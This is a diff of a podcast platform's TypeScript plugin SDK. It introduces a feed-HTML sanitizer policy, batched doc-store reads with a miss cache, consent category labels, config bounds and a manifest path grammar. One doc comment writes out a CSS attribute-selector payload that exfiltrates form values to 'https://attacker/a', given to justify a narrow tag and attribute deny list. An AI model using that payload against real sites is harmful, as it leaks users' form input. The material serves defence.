@@ -21,7 +21,7 @@
  * rejects a mismatch at startup (ARCHITECTURE §7.2). While the SDK is pre-1.0 a breaking change is
  * therefore a *minor* bump; from `1.0.0` on, breaking means major.
  */
-export const PLATFORM_API_VERSION = '0.15.0' as const;
+export const PLATFORM_API_VERSION = '0.16.0' as const;
 
 /** A user's role (ARCHITECTURE §8.5). Anonymous visitors have no role (`user` is `null`). */
 export type Role = 'admin' | 'podcaster' | 'fan';
@@ -125,10 +125,29 @@ export interface ThemeTokens {
   text: string;
   /** Muted/secondary text color. */
   textMuted: string;
-  /** Accent color. */
+  /**
+   * The accent as the admin chose it — for **fills** (buttons, badges, bars), paired with
+   * {@link accentContrast} for whatever sits on top.
+   *
+   * **Not for text, links or focus rings.** The seed is not contrast-checked against the page: a pale
+   * choice such as `#FFF176` measured 1.12:1 as link text. Use {@link accentText} (`--mc-accent-text`)
+   * for anything read or anything that marks focus.
+   */
   accent: string;
   /** Readable text color on top of {@link accent}. */
   accentContrast: string;
+  /**
+   * The accent clamped to WCAG AA (4.5:1) against both {@link bg} and {@link surface} — for **text,
+   * links and focus rings**, where {@link accent} may be unreadable.
+   *
+   * Optional because a host older than `0.16.0` does not send it. The host also sets
+   * `--mc-accent-text` on `:root`, which inherits through the shadow boundary, so in CSS
+   * `color: var(--mc-accent-text)` works whether or not this field is present. The SDK writes it onto
+   * `:host` only when it is.
+   *
+   * @since 0.16.0
+   */
+  accentText?: string;
   /** Optional secondary accent. */
   accent2?: string;
   /** Border/divider color. */
@@ -183,7 +202,9 @@ export interface PagedDocs<T = unknown> {
  *
  * ```text
  * GET    /api/plugins/{id}/data/{scopeType}/{scopeId}/{key}
- *          → one JSON doc; 404 if absent
+ *          → one JSON doc; 204 (no body) if the key is not set
+ * GET    /api/plugins/{id}/data/{scopeType}?ids=a,b&keys=x,y
+ *          → { a: { x: … }, b: {} } — misses absent; ≤ 100 ids and ≤ 100 keys (since 0.16.0)
  * GET    /api/plugins/{id}/data/{scopeType}/{scopeId}?prefix=&page=&size=
  *          → { items: [{ key, value }], page, size, totalElements, totalPages }
  * PUT    /api/plugins/{id}/data/{scopeType}/{scopeId}/{key}   (JSON body)
@@ -204,7 +225,8 @@ export interface PagedDocs<T = unknown> {
  * The doc a backend writes with `ctx.store().put(scope, key, value)` is the one read here at
  * `GET /api/plugins/{id}/data/{scopeType}/{scopeId}/{key}`: one store, two ends. The `user` scope is the
  * exception — it exists only here. A backend has no calling user, so it cannot write a user partition at
- * all and reads them only in aggregate, through the Java `DocStore.queryAcrossUsers(prefix)`.
+ * all and reads them only in aggregate, through the Java `ctx.allUsers().query(prefix)` — which the
+ * manifest has to declare ({@link PluginDataDeclaration.readsAllUsers}).
  *
  * ## Where per-user data goes
  *
@@ -269,7 +291,7 @@ export interface PagedDocs<T = unknown> {
  * await ctx.api.delete(`${mine}/${key}`);                     // idempotent
  *
  * // A leaderboard is not built here: the backend aggregates every user's marks with
- * // queryAcrossUsers(...) and writes the result to `${shared}/leaderboard` for this component to read.
+ * // ctx.allUsers().query(...) and writes the result to `${shared}/leaderboard` for this component to read.
  * // If the manifest declares that key backendOwned, a PUT to it from here is a 403 — by design.
  * const board = await ctx.api.get<Leaderboard>(`${shared}/leaderboard`);
  * ```
@@ -278,13 +300,16 @@ export interface PluginApiClient {
   /**
    * GET a path, resolving to the parsed JSON body.
    *
-   * Rejects with a {@link PluginApiError} on any non-2xx response — **including 404**, which is the
-   * normal answer for a document that does not exist yet. Prefer {@link getOrNull} when absence is an
-   * expected outcome rather than a failure.
+   * Rejects with a {@link PluginApiError} on any non-2xx response. A document that is simply not set
+   * answers **204** (since 0.16.0; it was a 404 before), which this resolves as **`undefined`** — so a
+   * raw `get` of a doc path can come back empty. Prefer {@link getOrNull}, or better `ctx.docs.get`,
+   * when absence is an expected outcome rather than a failure. A 404 now means the *address* is wrong:
+   * an unknown or disabled plugin, an unknown scope.
    */
   get<T = unknown>(path: string): Promise<T>;
   /**
-   * Like {@link get}, but resolves **`null`** on a 404 instead of rejecting.
+   * Like {@link get}, but resolves **`null`** for an absent document — the host's 204 — and on a 404
+   * instead of rejecting.
    *
    * "Nothing saved yet" is the ordinary state of a doc-store key, so every plugin ends up writing
    * `get(path).catch(() => undefined)` — which also swallows the 500, the 403 from the read floor and
@@ -294,7 +319,7 @@ export interface PluginApiClient {
    * Every other non-2xx still rejects with a {@link PluginApiError}.
    *
    * @param path the path relative to the plugin's base
-   * @returns the parsed body, or `null` when the host answered 404
+   * @returns the parsed body, or `null` when the host answered 204 or 404
    * @since 0.9.0
    */
   getOrNull<T = unknown>(path: string): Promise<T | null>;
@@ -383,6 +408,15 @@ export function isPluginApiError(e: unknown): e is PluginApiError {
 export const DOC_KEY_PATTERN = /^[A-Za-z0-9._:-]{1,200}$/;
 
 /**
+ * The most scope ids, and the most keys, one {@link DocClient.getMany} request carries — the host's
+ * per-request ceiling. The client splits a larger call for you, so this is for sizing, not a limit you
+ * have to enforce.
+ *
+ * @since 0.16.0
+ */
+export const DOC_BATCH_LIMIT = 100;
+
+/**
  * Which partition a {@link DocClient} call addresses.
  *
  * A {@link Scope} for a page-level partition — `ctx.scope` is usually the one you want — or one of two
@@ -397,7 +431,7 @@ export type DocTarget = Scope | 'self' | 'site';
 
 /**
  * A typed client for this plugin's doc store — the same endpoints {@link PluginApiClient} reaches, with
- * the path building, the key validation and the 404 handling done for you.
+ * the path building, the key validation and the absence handling done for you.
  *
  * Every doc access before this was string concatenation against a four-segment path, with the plugin
  * responsible for `encodeURIComponent`, for {@link DOC_KEY_PATTERN}, for knowing that `site` is always
@@ -426,11 +460,31 @@ export type DocTarget = Scope | 'self' | 'site';
  * unknown scope, the 401 on an anonymous `user` request. See {@link PluginApiClient} for all of it;
  * that client stays available as the escape hatch for anything this does not cover.
  *
+ * ## What it remembers for you (guaranteed since 0.16.0)
+ *
+ * "This episode has no highlight" is the **normal** answer for an optional per-episode document, and a
+ * tile asks for its keys every time it renders. Measured before these guarantees: 98% of one session's
+ * 3,737 plugin requests were answers of "not set", one key asked 178 times. So the host's client
+ * promises, per plugin and per signed-in identity, for the life of the page:
+ *
+ * 1. **Identical `get`s in flight share one request.**
+ * 2. **A miss is remembered.** A key the host answered "not set" resolves `null` without a round trip
+ *    from then on — misses from {@link getMany} included.
+ * 3. **Your own writes are seen.** `put` and `remove` through this client forget the address they
+ *    touched, so reading back what you just stored returns it rather than the earlier miss.
+ * 4. **Hits are never cached.** A document another session wrote shows up on the next render.
+ * 5. **An error is never remembered** — a 404 (unknown plugin or scope) or a 5xx is retried next time.
+ *
+ * What that means for your code: a cache of **misses** of your own is unnecessary — delete it. A cache
+ * of **hits** is allowed but harmful the moment it outlives a write made elsewhere; if you keep one,
+ * scope it to a render. And for more than one scope, use {@link getMany}: one request for a whole page
+ * of cards instead of one per card per key.
+ *
  * @since 0.9.0
  */
 export interface DocClient {
   /**
-   * One document, or **`null`** when there is none.
+   * One document, or **`null`** when there is none (the host's 204).
    *
    * Null rather than a rejection: absence is the ordinary state of a key nothing has written yet, and
    * making it an exception is what produced the `catch` that also swallowed every real failure. Other
@@ -441,6 +495,33 @@ export interface DocClient {
    * @throws Error synchronously-thrown-as-rejection if the key is malformed
    */
   get<T = unknown>(target: DocTarget, key: string): Promise<T | null>;
+  /**
+   * The same keys across many scopes of one level, in one request — what a page of episode cards needs.
+   *
+   * ```ts
+   * const slugs = ctx.episodes.slice(0, 20);
+   * const docs = await ctx.docs.getMany<Highlight>('episode', slugs, ['highlight', 'template']);
+   * for (const slug of slugs) render(slug, docs[slug]?.highlight ?? null);
+   * ```
+   *
+   * The answer maps scope id → key → value, and **a miss is simply absent**: no `null`, no error — an
+   * id with nothing set may be missing entirely or map to `{}`. Every access rule of {@link get} applies
+   * per id: the same read floor, and an id the caller may not address rejects the whole call with a
+   * {@link PluginApiError} rather than being quietly skipped.
+   *
+   * More than {@link DOC_BATCH_LIMIT} ids or keys is **split** into several requests and merged, so you
+   * never see the host's per-request ceiling. An empty `ids` or `keys` resolves `{}` without a request.
+   * Misses feed the same memory {@link get} uses, so a later `get` of one costs nothing.
+   *
+   * Not for `user` scope: there is one caller partition, and `get('self', key)` reads it.
+   *
+   * @param type the scope level every id belongs to
+   * @param ids  scope ids at that level — episode slugs, feed ids, `'main'` for the site
+   * @param keys document keys; each must match {@link DOC_KEY_PATTERN}
+   * @throws Error synchronously-thrown-as-rejection if a key is malformed
+   * @since 0.16.0
+   */
+  getMany<T = unknown>(type: Scope['type'], ids: string[], keys: string[]): Promise<Record<string, Record<string, T>>>;
   /**
    * Upserts a document. Last-write-wins, as everywhere on this store.
    *
@@ -1133,8 +1214,34 @@ function routeSegments(path: string): string[] {
 export interface DisplaySnapshot {
   /** The episode title from the feed. */
   title: string;
-  /** The episode description/show notes; may be empty. */
+  /**
+   * The episode's show notes **exactly as the third-party feed published them** — HTML; may be empty.
+   *
+   * **Untrusted input. Never assign it to `innerHTML` as it stands.** The host does not sanitize this
+   * field: it is whatever the podcast host put in the feed, fetched over the network, and anyone who can
+   * edit that feed controls it. The shell renders the same string only through its own sanitizer; a
+   * plugin that inserts it raw gets markup and CSS injection on a page with `style-src 'unsafe-inline'` —
+   * a full-viewport overlay, or attribute-selector CSS that exfiltrates form values. Either:
+   *
+   * - show {@link descriptionText} (plain text — the right choice for a card or a teaser), or
+   * - pass it through {@link PluginContext.sanitize} first, which applies the shell's own policy.
+   *
+   * ```ts
+   * body.innerHTML = ctx.sanitize(snap.description);   // never: body.innerHTML = snap.description
+   * ```
+   */
   description: string;
+  /**
+   * The same show notes as **plain text** — tags removed and entities decoded by the host. Never absent;
+   * empty when the feed has no description.
+   *
+   * Safe to put in `textContent` as it stands, and what a card, a teaser, a tooltip or a search excerpt
+   * should use. Whitespace between block elements is collapsed to single spaces, so it is one run of
+   * prose, not a layout.
+   *
+   * @since 0.16.0
+   */
+  descriptionText: string;
   /** The enclosure audio URL; absent for a `PLANNED` episode with no audio yet. */
   audioUrl?: string;
   /** The publication timestamp (ISO-8601 instant); absent for a `PLANNED` episode. */
@@ -1176,6 +1283,69 @@ export function resolveArtwork(snapshot: DisplaySnapshot): string | undefined {
 export const DISPLAY_BATCH_LIMIT = 200;
 
 /**
+ * The HTML policy the host applies to third-party markup — mirror of the shell's feed-HTML sanitizer,
+ * and what {@link PluginContext.sanitize} applies.
+ *
+ * Plain data, so the SDK stays dependency-free and the host can import this one object instead of
+ * keeping a copy. The names map one-to-one onto DOMPurify's config keys (`ALLOWED_TAGS`,
+ * `ALLOWED_ATTR`, `FORBID_TAGS`, `FORBID_ATTR`, `ALLOWED_URI_REGEXP`) for a plugin that must run its own
+ * sanitizer somewhere `ctx` does not reach — but prefer `ctx.sanitize`, which is the same decision
+ * without a dependency.
+ *
+ * ## Why not DOMPurify's defaults
+ *
+ * The defaults are built to stop *script execution*, and they do. They also permit `<style>` and the
+ * `style` attribute, filtering CSS only for `expression()` and `behavior:`, not for `url()`. The plugin
+ * contract requires `style-src 'unsafe-inline'` (Web Components style their shadow roots), and `img-src`
+ * stays open to any `https:` origin because artwork comes from arbitrary feed hosts. Together that makes
+ * any unsanitized stylesheet reachable, with two measured consequences:
+ *
+ * - a fixed, full-viewport, high-`z-index` block is **click-jacking** over the site chrome;
+ * - `input[value^="a"]{background-image:url(https://attacker/a)}` **exfiltrates** rendered form values
+ *   one character at a time.
+ *
+ * So the lists are narrow and explicit: prose, links, lists, tables and images. Widening one is a
+ * decision somebody makes on purpose; inheriting a default is a decision nobody made.
+ *
+ * @since 0.16.0
+ */
+export const FEED_HTML_POLICY: Readonly<{
+  /**
+   * Every element that survives. Anything else is unwrapped — the element goes, its text stays — except
+   * elements whose content is never prose (`script`, `style`, `template`, `iframe`, `svg`, …), which go
+   * with their content.
+   */
+  allowedTags: readonly string[];
+  /** Every attribute that survives, on any allowed element. */
+  allowedAttrs: readonly string[];
+  /**
+   * Elements that never survive, even if a later edit adds them to `allowedTags` — belt and braces, so
+   * widening one list cannot quietly reopen what this policy exists to close.
+   */
+  forbidTags: readonly string[];
+  /** Attributes removed even if a later edit adds them to `allowedAttrs`. */
+  forbidAttrs: readonly string[];
+  /** What an `href` or `src` may start with; anything else (`javascript:`, `data:`) is dropped. */
+  allowedUriRegexp: RegExp;
+  /** The `rel` put on every link that leaves the site, next to `target="_blank"`. */
+  externalLinkRel: string;
+}> = Object.freeze({
+  allowedTags: Object.freeze([
+    'a', 'abbr', 'b', 'blockquote', 'br', 'cite', 'code', 'dd', 'del', 'dl', 'dt', 'em', 'figcaption',
+    'figure', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'hr', 'i', 'img', 'ins', 'kbd', 'li', 'ol', 'p', 'pre',
+    'q', 's', 'samp', 'small', 'span', 'strong', 'sub', 'sup', 'table', 'tbody', 'td', 'tfoot', 'th',
+    'thead', 'tr', 'u', 'ul', 'var',
+  ]),
+  allowedAttrs: Object.freeze(['href', 'title', 'alt', 'src', 'width', 'height', 'lang', 'dir', 'colspan', 'rowspan']),
+  forbidTags: Object.freeze(['style', 'script', 'iframe', 'object', 'embed', 'form', 'input', 'link', 'base']),
+  forbidAttrs: Object.freeze(['style', 'srcset', 'formaction', 'ping']),
+  allowedUriRegexp: /^(?:https?:|mailto:|tel:|#|\/)/i,
+  // `noopener noreferrer` is mandatory with target=_blank; `nofollow ugc` because this markup is a third
+  // party's, published through the operator's site. The same string the server writes into the no-JS copy.
+  externalLinkRel: 'noopener noreferrer nofollow ugc',
+});
+
+/**
  * Read access to episode display snapshots — the frontend half of the Java `FeedAccess`.
  *
  * The Java contract could read a snapshot and the frontend could not, so a plugin that wanted to draw an
@@ -1197,6 +1367,9 @@ export const DISPLAY_BATCH_LIMIT = 200;
  * **Not authoritative, and it should keep saying so.** The snapshot is overwritten on every feed
  * refetch. That is a feature — a feed edit propagates — and the reason to read it live rather than copy
  * it. Cache per render, never per install.
+ *
+ * **`description` is untrusted third-party HTML** — see {@link DisplaySnapshot.description}. Show
+ * `descriptionText`, or run `description` through {@link PluginContext.sanitize}; never insert it raw.
  *
  * ```ts
  * const cards = await ctx.feeds.displayMany(ctx.episodes.slice(0, 20));
@@ -1524,7 +1697,7 @@ export interface NotifyMessage {
  * a person who did not ask for it, so the host draws two lines you cannot move:
  *
  * - **You may only notify users you already hold `user`-scope data for.** Enforced against the same
- *   partitions the backend's `queryAcrossUsers` reads: bingo may write to its participants because
+ *   partitions the backend's `allUsers().query(...)` reads: bingo may write to its participants because
  *   participants have rows, and no plugin can reach a user who never touched it.
  * - **The rate limits are the host's** — per recipient per window, plus a ceiling across all recipients.
  *   A limit a plugin enforces is a limit a plugin can drop, so there is no counter here to read.
@@ -1599,8 +1772,9 @@ export interface NotifyClient {
  * assume `has('analytics')` says anything about *which* provider was accepted — it says the category was.
  *
  * If you need a visitor to be able to accept one of your services and refuse another, declare them under
- * **different categories** (a plugin-declared category is allowed, it just has no translated label in the
- * shell). That is the only lever the contract gives you.
+ * **different categories** (a plugin-declared category is allowed; since `0.16.0` give it a label with
+ * {@link PluginConsentCategoryLabel} — without one the shell can only show a generic phrase around the
+ * raw id). That is the only lever the contract gives you.
  *
  * ## `necessary` is never asked about
  *
@@ -1747,6 +1921,21 @@ export interface PluginDataDeclaration {
    * the backend cannot write at all — even a bare `*` leaves those to their owner.
    */
   backendOwned?: string[];
+  /**
+   * Whether this plugin's **backend** may read every user's `user` partition at once — the Java
+   * `ctx.allUsers()`, which is `null` without this.
+   *
+   * It is the one read that crosses an ownership boundary: every account's documents, each with the
+   * owner's UUID. That is a different thing to be told about before installing than "keeps per-user
+   * data", which is all the `user` scope implies — so it is declared, like `blobs`, `identity` and
+   * `notifications`, and absent means no. Declare it for a leaderboard, a rollup, a moderation view.
+   *
+   * Nothing changes for the frontend: a browser only ever reads its own partition, `'self'`, whatever
+   * this says. Until `0.16.0` the capability was `DocStore.queryAcrossUsers` and every plugin had it.
+   *
+   * @since 0.16.0
+   */
+  readsAllUsers?: boolean;
 }
 
 /**
@@ -1823,6 +2012,47 @@ export interface ConsentServiceDeclaration {
   thirdCountryTransfer: boolean;
   /** Each item the service stores on the visitor's device. */
   storage: ConsentStorageDeclaration[];
+}
+
+/**
+ * What a visitor reads for a consent category **your plugin introduced** — one entry of the manifest's
+ * `consent.categoryLabels`, keyed by the category id.
+ *
+ * The category is the thing being consented to, so it is the one plugin-authored string that cannot fall
+ * back to a developer key. The core categories (`necessary`, `functional`, `analytics`) have a title and
+ * an explanation in every shell language; a plugin-declared one such as `social` used to appear as the
+ * bare lowercase word, with nothing to say what it covers, between two that explain themselves.
+ *
+ * ```json
+ * "consent": {
+ *   "services": [{ "id": "mastodon", "category": "social", … }],
+ *   "categoryLabels": {
+ *     "social": {
+ *       "label": { "en": "Social media", "de": "Soziale Medien" },
+ *       "hint": { "en": "Posts embedded from social networks.", "de": "Eingebettete Beiträge aus sozialen Netzwerken." }
+ *     }
+ *   }
+ * }
+ * ```
+ *
+ * The rules the host applies:
+ *
+ * - **Declaring a category outside the core vocabulary obliges you to label it.** An unlabelled one still
+ *   loads, but the host shows it wrapped in a generic localised phrase ("Other services: social") rather
+ *   than as a choice it can explain — which is a worse consent request, not a neutral one.
+ * - **A core category cannot be relabelled.** An entry for `necessary`, `functional` or `analytics` is
+ *   refused at load: a plugin rewording what every other plugin's visitors consent to is not a label.
+ * - **An entry must label a category one of your services declares**, and is refused at load otherwise.
+ * - **Two plugins labelling the same category** is resolved by the host, deterministically — the
+ *   decision is shared across plugins (see {@link ConsentApi}), so only one label can be shown.
+ *
+ * @since 0.16.0
+ */
+export interface PluginConsentCategoryLabel {
+  /** The category's name in the consent notice and the settings page — short, like a heading. */
+  label: LocalizedText;
+  /** One sentence under it: what accepting this category lets load, in the visitor's terms. */
+  hint?: LocalizedText;
 }
 
 /**
@@ -2011,6 +2241,33 @@ export interface PluginConfigField {
    * @since 0.15.0
    */
   options?: PluginConfigOption[];
+  /**
+   * The smallest value a `number` field accepts, inclusive.
+   *
+   * Without it, any number an operator can type is legal — including the `0` that switches a scheduled
+   * task off, or the `-1` that gets it rejected at the next boot. Declare the constraint here rather than
+   * clamping in code, where it runs only after the bad value is stored and the form has said "Saved."
+   *
+   * The host enforces every bound below the same way: an out-of-range write is **refused** with a 400 that
+   * names the bound (never silently clamped); the admin form renders them as input constraints; a manifest
+   * whose `default` breaks its own bounds, whose `min` exceeds its `max`, or that puts a bound on the
+   * wrong type (`min` on a `string`, `maxLength` on a `number`) is refused at load; and a value stored
+   * before a bound existed that now breaks it is treated as **unset**, so the default applies.
+   *
+   * @since 0.16.0
+   */
+  min?: number;
+  /** The largest value a `number` field accepts, inclusive. See {@link min}. @since 0.16.0 */
+  max?: number;
+  /**
+   * The granularity of a `number` field: a value must be `min + k·step` (or `k·step` without `min`).
+   * `1` makes a field whole-numbered. Must be positive. See {@link min}. @since 0.16.0
+   */
+  step?: number;
+  /** The fewest characters a `string` field accepts; `1` makes it non-empty. See {@link min}. @since 0.16.0 */
+  minLength?: number;
+  /** The most characters a `string` field accepts. See {@link min}. @since 0.16.0 */
+  maxLength?: number;
 }
 
 /** The shape of the manifest's `blobs` block (ARCHITECTURE §11.1). @since 0.9.0 */
@@ -2079,6 +2336,29 @@ export interface PluginExternalDeclaration {
 }
 
 /**
+ * The grammar of `frontend.entry` — mirror of the host's `PluginManifest.FRONTEND_ENTRY_PATTERN`.
+ *
+ * A relative path under the plugin's own `assets/`: one or more `[A-Za-z0-9._-]` segments joined by `/`,
+ * with no leading slash, no `.` or `..` segment, no empty segment, and no query or fragment.
+ *
+ * It is the one manifest string that becomes a URL path, and it was the last one without a grammar: the
+ * shell builds `/plugins/<id>/assets/<entry>` by interpolation, so an entry carrying `../`, `?` or `#`
+ * addressed something other than what its author wrote. The host **rejects** a manifest whose entry does
+ * not match — at load, with the entry named — rather than dropping the field, the same rule
+ * {@link PluginDataDeclaration.backendOwned} follows: a plugin whose bundle silently never loads is worse
+ * than one that fails with a named cause. Test your manifest against this to find out before the host
+ * does.
+ *
+ * ```ts
+ * FRONTEND_ENTRY_PATTERN.test('sample.es.js');   // true
+ * FRONTEND_ENTRY_PATTERN.test('../sample.es.js'); // false
+ * ```
+ *
+ * @since 0.16.0
+ */
+export const FRONTEND_ENTRY_PATTERN = /^(?!\.{1,2}(\/|$))[A-Za-z0-9._-]+(\/(?!\.{1,2}(\/|$))[A-Za-z0-9._-]+)*$/;
+
+/**
  * The whole of `plugin.json`, typed.
  *
  * ## Read this before relying on it
@@ -2134,7 +2414,12 @@ export interface PluginManifest {
   };
   /** The frontend half: the bundle and the custom elements it registers. */
   frontend?: {
-    /** The ES module entry, relative to the plugin's bundle. */
+    /**
+     * The ES module entry, relative to the plugin's own `assets/` — e.g. `sample.es.js`.
+     *
+     * Must match {@link FRONTEND_ENTRY_PATTERN}: `[A-Za-z0-9._-]` segments joined by `/`, no leading
+     * slash, no `.`/`..` segment, no query or fragment. The host rejects the plugin at load otherwise.
+     */
     entry: string;
     /** Every custom-element tag the entry registers. Each `slots[].element` must be one of these. */
     elements: string[];
@@ -2160,7 +2445,15 @@ export interface PluginManifest {
   /** Config fields core renders as an admin form; plugins never build their own config UI. */
   config?: Record<string, PluginConfigField>;
   /** Third-party services this plugin loads. Omit entirely when it loads none. */
-  consent?: { services: ConsentServiceDeclaration[] };
+  consent?: {
+    /** Every service, each under the category the visitor decides it by. */
+    services: ConsentServiceDeclaration[];
+    /**
+     * Labels for the categories your services introduce, keyed by category id — see
+     * {@link PluginConsentCategoryLabel}. @since 0.16.0
+     */
+    categoryLabels?: Record<string, PluginConsentCategoryLabel>;
+  };
   /** The host ignores fields it does not know, so this type does too. */
   [field: string]: unknown;
 }
@@ -2319,7 +2612,7 @@ export interface PluginContext {
   api: PluginApiClient;
   /**
    * A typed client for the same doc store {@link api} reaches — path building, key validation and
-   * null-on-404 done for you.
+   * null-when-absent done for you, plus request dedupe and a miss cache — see {@link DocClient}.
    *
    * Never `null`: every plugin has a doc store. `ctx.api` remains the escape hatch for anything this
    * does not cover. See {@link DocClient}, and note `'self'` for the caller's own partition.
@@ -2337,6 +2630,39 @@ export interface PluginContext {
    * @since 0.9.0
    */
   feeds: FeedsClient;
+  /**
+   * Makes HTML your plugin did not write safe to put in `innerHTML` — with **the host's own policy**,
+   * the one the shell applies to feed HTML ({@link FEED_HTML_POLICY}).
+   *
+   * Use it for everything you did not author: a {@link DisplaySnapshot.description}, a user's or a
+   * podcaster's rich text, rendered Markdown, anything fetched. It exists so that a plugin cannot end up
+   * with a *weaker* policy than the host by writing less code: reaching for `DOMPurify.sanitize(html)`
+   * with library defaults lets `<style>` and `style=` through, which is exactly what the host refuses and
+   * why (see {@link FEED_HTML_POLICY}).
+   *
+   * What it does, and nothing else:
+   *
+   * - keeps only the allowed tags and attributes, dropping `<style>`, `<script>`, `<iframe>`, forms and
+   *   every `style`, `srcset` and event-handler attribute — including their content where that could run
+   *   or style anything;
+   * - drops an `href`/`src` that is not `http(s):`, `mailto:`, `tel:`, `#…` or a `/` path;
+   * - gives every link that leaves the site `target="_blank"` and `rel="noopener noreferrer nofollow ugc"`
+   *   — following one in the same tab would tear down the SPA and stop the player.
+   *
+   * Synchronous and never `null`: there is nothing to declare, because it grants nothing. Run it on the
+   * **final** HTML, after Markdown rendering — sanitizing the input and then transforming it undoes the
+   * point.
+   *
+   * ```ts
+   * root.querySelector('.notes')!.innerHTML = ctx.sanitize(snap.description);
+   * root.querySelector('.page')!.innerHTML = ctx.sanitize(marked.parse(markdown));
+   * ```
+   *
+   * @param html untrusted HTML; `null`, `undefined` and `''` all give `''`
+   * @returns HTML safe to assign to `innerHTML` inside your shadow root
+   * @since 0.16.0
+   */
+  sanitize(html: string | null | undefined): string;
   /**
    * The site's shared tag vocabulary, or **`null`** when the manifest declares no `tags` block
    * (ARCHITECTURE §6.1).
@@ -2605,6 +2931,7 @@ const THEME_TOKEN_VARS: ReadonlyArray<[keyof ThemeTokens, string]> = [
   ['textMuted', '--mc-text-muted'],
   ['accent', '--mc-accent'],
   ['accentContrast', '--mc-accent-contrast'],
+  ['accentText', '--mc-accent-text'],
   ['accent2', '--mc-accent-2'],
   ['border', '--mc-border'],
 ];
